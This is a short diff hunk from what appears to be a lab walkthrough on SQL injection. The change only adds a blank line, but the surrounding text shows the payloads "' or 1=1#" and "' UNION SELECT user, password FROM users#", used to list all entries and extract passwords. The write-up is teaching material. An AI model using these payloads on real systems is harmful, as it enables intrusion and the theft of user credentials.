@@ -605,6 +605,7 @@ we can see all entries with `' or 1=1#` :
 <img width="248" alt="image" src="https://user-images.githubusercontent.com/79740895/185461785-b0426c0a-db1c-4118-b654-fe62a8b607c9.png">
 
 We can extract all passwords with payload:
+
 ```' UNION SELECT user, password FROM users#```
 
 <img width="271" alt="image" src="https://user-images.githubusercontent.com/79740895/185463551-74dfcac3-bed2-44b5-9fd8-4bf6bcc78e2b.png">
